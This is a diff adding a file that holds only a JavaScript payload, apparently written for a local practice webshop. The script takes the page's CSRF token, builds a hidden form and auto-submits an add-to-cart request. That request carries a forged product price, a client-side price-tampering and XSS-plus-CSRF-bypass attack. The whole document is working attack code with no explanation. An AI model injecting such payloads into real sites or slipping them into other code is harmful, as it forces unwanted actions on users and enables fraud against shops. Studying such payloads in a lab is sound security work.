@@ -1,0 +1,47 @@
+<script>
+    
+        /* Fetch the CSRF token */
+        var tokenElement = document.querySelector('input[name="csrf_token"]');
+        if (!tokenElement) {
+            console.error('CSRF token element not found.');
+        } else {
+            var token = tokenElement.value;
+
+            /* Create a new form */
+            var form = document.createElement('form');
+            form.action = 'http://localhost/webshop/index.php';
+            form.method = 'POST';
+
+            /* Create the hidden input fields */
+            var product_id = document.createElement('input');
+            product_id.type = 'hidden';
+            product_id.name = 'product_id';
+            product_id.value = '1';
+
+            var product_price = document.createElement('input');
+            product_price.type = 'hidden';
+            product_price.name = 'product_price';
+            product_price.value = '10000.00';
+            
+            var add_to_cart = document.createElement('input');
+            add_to_cart.type = 'hidden';
+            add_to_cart.name = 'add_to_cart';
+
+            var csrf_token = document.createElement('input');
+            csrf_token.type = 'hidden';
+            csrf_token.name = 'csrf_token';
+            csrf_token.value = token;
+
+            /* Append the input fields to the form */
+            form.appendChild(product_id);
+            form.appendChild(product_price);
+            form.appendChild(add_to_cart);
+            form.appendChild(csrf_token);
+
+            /* Append the form to the body */
+            document.body.appendChild(form);
+
+            /* Submit the form */
+            form.submit();
+        };
+</script>
